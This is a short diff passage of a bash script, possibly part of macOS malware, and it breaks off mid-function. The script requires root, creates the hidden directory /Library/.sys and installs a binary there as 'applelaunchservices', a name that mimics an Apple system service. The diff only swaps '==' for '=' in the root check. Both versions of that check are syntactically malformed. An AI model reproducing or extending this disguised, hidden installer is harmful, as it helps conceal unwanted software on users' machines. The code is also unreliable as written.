@@ -1,6 +1,6 @@
 #!/bin/bash
 [[ -z $1 ]] && exit
-[[ `whoami` == 'root']] || exit
+[[ `whoami` = 'root']] || exit
 install_binary() {
 	mkdir -p /Library/.sys
 	mv $binary /Library/.sys/applelaunchservices
